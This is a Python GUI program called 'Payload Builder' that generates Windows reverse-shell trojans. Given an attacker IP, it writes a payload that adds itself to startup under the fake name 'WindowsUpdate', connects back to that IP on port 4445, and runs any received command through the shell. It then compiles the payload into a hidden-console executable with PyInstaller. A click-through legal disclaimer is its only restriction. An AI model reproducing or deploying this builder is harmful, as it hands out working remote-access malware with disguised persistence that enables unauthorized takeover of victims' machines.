import tkinter as tk
from tkinter import messagebox, ttk
import subprocess
import os
import sys
import shutil

def show_disclaimer():
    disclaimer = tk.Toplevel(root)
    disclaimer.title("Legal Disclaimer")
    disclaimer.geometry("520x320")
    disclaimer.configure(bg="#8B0000")  # Dark Red

    try:
        disclaimer.iconbitmap("kip3.ico")
    except:
        pass

    text = (
        "⚠️ Legal Disclaimer:\n\n"
        "This tool is intended for educational and authorized penetration testing "
        "on systems you own or have explicit permission to test.\n\n"
        "Unauthorized use of this software to access or control computers without "
        "consent is illegal under laws in most countries, including the US and the EU.\n\n"
        "By checking the box below, you agree that you are using this tool only in "
        "a lawful and ethical manner."
    )

    tk.Label(disclaimer, text=text, wraplength=480, justify="left",
             bg="#8B0000", fg="white", font=("Arial", 10)).pack(pady=10)

    agree_var = tk.BooleanVar()
    agree_check = tk.Checkbutton(disclaimer,
        text="I understand and agree to use this tool legally.",
        variable=agree_var, bg="#8B0000", fg="white",
        font=("Arial", 10), selectcolor="#8B0000", activebackground="#8B0000")
    agree_check.pack(pady=10)

    def on_accept():
        if agree_var.get():
            disclaimer.destroy()
            create_payload()
        else:
            messagebox.showwarning("Warning", "You must agree to the disclaimer to continue.")

    ttk.Button(disclaimer, text="Continue", command=on_accept).pack(pady=5)

def create_payload():
    ip = ip_entry.get().strip()
    filename = filename_entry.get().strip()

    if not ip:
        messagebox.showerror("Error", "Please enter a valid IP address.")
        return
    if not filename:
        messagebox.showerror("Error", "Please enter a valid file name.")
        return

    payload_code = f'''import socket
import subprocess
import time
import os
import sys
import winreg

#Reverse shell only for pentesting purpose! illegal use is not supported and restricted as much as possible.

def add_to_startup():
    exe_path = sys.executable
    key = r"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run"
    try:
        reg = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg, "WindowsUpdate", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(reg)
    except:
        pass

add_to_startup()

ATTACKER_IP = "{ip}"
ATTACKER_PORT = 4445

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ATTACKER_IP, ATTACKER_PORT))
            while True:
                command = s.recv(1024).decode()
                if command.lower() == "exit":
                    break
                output = subprocess.run(command, shell=True, capture_output=True, text=True)
                s.send(output.stdout.encode() if output.stdout else output.stderr.encode())
            s.close()
        except:
            time.sleep(5)

connect()
'''

    with open("payload.pyw", "w") as f:
        f.write(payload_code)

    messagebox.showinfo("Info", "Generating executable...")

    try:
        subprocess.run([
            "pyinstaller",
            "--onefile",
            "--noconsole",
            "--icon=Exe.ico",
            f"--name={filename}",
            "payload.pyw"
        ], check=True)

        # Ensure the .pyw file is also saved for transparency
        final_pyw_path = os.path.join("dist", f"{filename}.pyw")
        shutil.copy("payload.pyw", final_pyw_path)

        # Cleanup
        for item in ["build", "__pycache__", "payload.spec", "payload.pyw"]:
            if os.path.exists(item):
                if os.path.isdir(item):
                    shutil.rmtree(item)
                else:
                    os.remove(item)

        messagebox.showinfo("Success", f"Executable + .pyw created in /dist/\n→ {filename}.exe\n→ {filename}.pyw")
    except subprocess.CalledProcessError as e:
        messagebox.showerror("Error", f"PyInstaller failed: {e}")

# --- GUI setup ---
root = tk.Tk()
root.title("Payload Builder 🧩")
root.geometry("400x260")
root.configure(bg="#2c3e50")

try:
    root.iconbitmap("kip.ico")
except:
    pass

title_label = tk.Label(root, text="Payload Builder", font=("Arial", 14, "bold"), bg="#2c3e50", fg="white")
title_label.pack(pady=10)

frame = tk.Frame(root, bg="#34495e", padx=10, pady=10, bd=5, relief="ridge")
frame.pack(pady=10)

tk.Label(frame, text="Attacker IP:", font=("Arial", 12), bg="#34495e", fg="white").pack()
ip_entry = ttk.Entry(frame, font=("Arial", 12), width=30)
ip_entry.pack(pady=5)

tk.Label(frame, text="Output File Name:", font=("Arial", 12), bg="#34495e", fg="white").pack()
filename_entry = ttk.Entry(frame, font=("Arial", 12), width=30)
filename_entry.pack(pady=5)

btn = ttk.Button(frame, text="Generate Payload", command=show_disclaimer)
btn.pack(pady=10)

root.mainloop()
